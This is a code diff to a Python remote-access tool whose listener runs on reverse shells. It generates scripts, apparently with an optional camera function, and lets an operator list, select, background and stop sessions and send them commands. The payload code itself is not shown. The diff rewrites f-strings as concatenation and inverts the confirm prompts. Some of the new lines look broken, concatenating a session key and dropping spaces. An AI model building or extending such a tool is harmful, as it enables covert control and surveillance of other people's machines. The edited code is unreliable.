@@ -107,11 +107,11 @@ def generate_script():
     while True:
         host = input("Please input your listening host: ")
         port = input("Please input your listening port: ")
-        confirm = input(f"Your listening host: {host}, port: {port}, (y/n)")
-        if confirm.lower() == "y":
-            break
-        else:
+        confirm = input(f"Your listening host: " + host + ", port: " + port + ", (y/n)")
+        if confirm.lower() == "n":
             continue
+        else:
+            break
     if sel == '0':
         while True:
             option = bcolors.BOLD + "\nGenerate with camera function will make the " \
@@ -145,11 +145,11 @@ def start_listening():
     while True:
         host = input("Please input listening host: ")
         port = input("Please input listening port: ")
-        confirm = input(f"Your listening host: {host}, port: {port}, (Y/N)")
-        if confirm.lower() == "y":
-            break
-        else:
+        confirm = input(f"Your listening host: " + host + ", port: " + port + ", (Y/N)")
+        if confirm.lower() == "n":
             continue
+        else:
+            break
     menu = "=========================================================\n"
     menu += "The Listening mode is base on Reverse Shell        \n"
     menu += "You can use some extra command below \n\n"
@@ -169,14 +169,14 @@ def start_listening():
         elif se[:8] == 'sessions':
             if l.sessions.keys():
                 for k in l.sessions.keys():
-                    print(bcolors.GREEN + f"Session {k} open" + bcolors.ENDC)
+                    print(bcolors.GREEN + "Session" + k + "open" + bcolors.ENDC)
             else:
                 print("No session")
         elif se[:10] == "session -d":
             num = se[11:]
             try:
                 l.stop(int(num))
-                print(f"stop session {num} sucessful!")
+                print("stop session" + num + "sucessful!")
             except:
                 print("stop failed!")
         elif se[:10] == "session -t":
@@ -193,13 +193,13 @@ def start_listening():
                 try:
                     num = se[8:]
                     ses = l.sessions.get(int(num))
-                    print(f"select session {num}")
+                    print("select session " + num)
                     print(ses[2])
                     parent_conn = ses[0]
                     while l.sessions.get(int(num)):
                         cmd = input()
                         if cmd == "background":
-                            print(bcolors.OCRA + f"session {num} background.." + bcolors.ENDC)
+                            print(bcolors.OCRA + "session" + num + "background.." + bcolors.ENDC)
                             break
                         else:
                             parent_conn.send(cmd)
